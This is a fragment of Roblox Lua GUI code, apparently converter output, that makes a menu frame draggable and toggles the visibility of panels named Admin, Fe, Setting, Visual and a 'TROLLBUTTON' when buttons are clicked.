-- Scripts:

local function YMJJYSG_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	script.Parent.ResetOnSpawn = false
end
coroutine.wrap(YMJJYSG_fake_script)()
local function IFCNROC_fake_script() -- MainBoi.LocalScript 
	local script = Instance.new('LocalScript', MainBoi)

	script.Parent.Draggable = true
	script.Parent.Active = true
end
coroutine.wrap(IFCNROC_fake_script)()
local function WWFRVS_fake_script() -- CLOSEGUI.LocalScript 
	local script = Instance.new('LocalScript', CLOSEGUI)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainBoi.Visible = false
		script.Parent.Parent.Parent.TROLLBUTTON.Visible = true
	end)
end
coroutine.wrap(WWFRVS_fake_script)()
local function GGWWM_fake_script() -- SettingTab.LocalScript 
	local script = Instance.new('LocalScript', SettingTab)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Admin.Visible = false
		script.Parent.Parent.Parent.Fe.Visible = false
		script.Parent.Parent.Parent.Setting.Visible = true
		script.Parent.Parent.Parent.Visual.Visible = false
		script.Parent.Parent.Parent.Notes.Visible = false
		script.Parent.Parent.Parent.HatsRequired.Visible = false
	end)
end
coroutine.wrap(GGWWM_fake_script)()
